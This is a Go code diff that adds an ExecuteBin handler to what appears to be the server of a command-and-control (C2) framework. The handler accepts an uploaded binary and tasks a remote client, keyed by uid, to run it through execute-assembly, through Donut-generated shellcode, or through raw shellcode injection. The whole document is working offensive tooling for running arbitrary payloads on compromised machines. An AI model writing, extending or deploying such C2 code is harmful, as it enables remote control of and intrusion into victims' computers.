@@ -3,6 +3,7 @@ package api
 import (
 	"BackendTemplate/pkg/command"
 	"BackendTemplate/pkg/database"
+	"BackendTemplate/pkg/godonut"
 	"BackendTemplate/pkg/sendcommand"
 	"BackendTemplate/pkg/utils"
 	"context"
@@ -475,4 +476,67 @@ func EditColor(c *gin.Context) {
 	}
 	database.Engine.Where("uid = ?", colorBody.Uid).Update(&database.Clients{Color: colorBody.Color})
 	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+}
+func ExecuteBin(c *gin.Context) {
+	file, _ := c.FormFile("file")
+	if file == nil {
+		c.JSON(200, gin.H{"status": 400, "data": "No file uploaded"})
+		return
+	}
+	// 打开上传的文件
+	src, err := file.Open()
+	if err != nil {
+		c.JSON(200, gin.H{"status": 400, "data": "Unable to open file"})
+		return
+	}
+	defer src.Close()
+
+	// 读取文件内容到字节数组
+	fileBytes, err := ioutil.ReadAll(src)
+	if err != nil {
+		c.JSON(200, gin.H{"status": 400, "data": "Unable to read file"})
+		return
+	}
+
+	uid := c.PostForm("uid")
+	args := c.PostForm("args")
+	mode := c.PostForm("mode")
+
+	var shellHistory database.Shell
+	database.Engine.Where("uid = ?", uid).Get(&shellHistory)
+	shellHistory.ShellContent = shellHistory.ShellContent + "$ " + mode + " " + file.Filename + " " + args + "\n"
+	database.Engine.Where("uid = ?", uid).Update(&shellHistory)
+
+	c.JSON(http.StatusOK, gin.H{"status": http.StatusOK})
+
+	switch mode {
+	case "execute-assembly":
+		fileLength := len(fileBytes)
+		fileLengthBytes := make([]byte, 4)
+		binary.BigEndian.PutUint32(fileLengthBytes, uint32(fileLength))
+		byteToSend := utils.BytesCombine(fileLengthBytes, fileBytes, []byte(args))
+
+		cmdTypeBytes := make([]byte, 4)
+		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.ExecuteAssembly))
+		byteToSend = append(cmdTypeBytes, byteToSend...)
+		sendcommand.SendFileUploadCommand(uid, byteToSend)
+	case "inline-bin":
+		var u database.Clients
+		database.Engine.Where("uid = ?", uid).Get(&u)
+
+		payload, err := godonut.GenShellcode(fileBytes, args, u.Arch)
+		if err != nil {
+			c.JSON(http.StatusOK, gin.H{"status": 400, "data": "Unable to generate shellcode"})
+		}
+		cmdTypeBytes := make([]byte, 4)
+		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
+		byteToSend := utils.BytesCombine(cmdTypeBytes, payload)
+		sendcommand.SendFileUploadCommand(uid, byteToSend)
+	case "shellcode-inject":
+		cmdTypeBytes := make([]byte, 4)
+		binary.BigEndian.PutUint32(cmdTypeBytes, uint32(command.InlineBin))
+		byteToSend := utils.BytesCombine(cmdTypeBytes, fileBytes)
+		sendcommand.SendFileUploadCommand(uid, byteToSend)
+	}
+
 }
